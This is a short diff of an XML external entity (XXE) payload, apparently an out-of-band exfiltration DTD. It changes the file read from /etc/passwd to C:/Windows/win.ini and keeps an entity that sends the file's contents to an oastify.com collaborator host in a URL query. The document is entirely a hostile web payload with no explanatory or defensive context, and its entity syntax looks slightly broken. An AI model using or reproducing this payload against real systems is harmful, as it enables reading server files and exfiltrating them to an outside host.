@@ -1,3 +1,4 @@
-<!ENTITY file SYSTEM "file:///etc/passwd">
+<!ENTITY file SYSTEM "file:///C:/Windows/win.ini">
 <!ENTITY all "!ENTITY send SYSTEM 'http://k9uvypca20h5rxx08mfj3gqdu40volca.oastify.com/?data=%file;'">
+
 %all;
